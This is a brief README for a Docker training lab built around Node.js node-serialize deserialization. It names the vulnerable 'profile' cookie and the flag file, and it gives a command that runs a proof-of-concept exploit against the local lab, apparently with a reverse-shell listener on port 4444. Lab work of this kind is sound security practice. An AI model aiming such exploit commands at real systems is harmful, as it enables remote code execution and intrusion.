# Node Deserialization Lab (Docker)

```bash
./labctl.sh up node-deserial
```

- URL: http://127.0.0.1:8104/
- Cookie: `profile` (node-serialize JSON)
- Flag: `/flag.txt`

```bash
python3 ../poc.py 127.0.0.1 8104 127.0.0.1 4444 --param-name profile
```
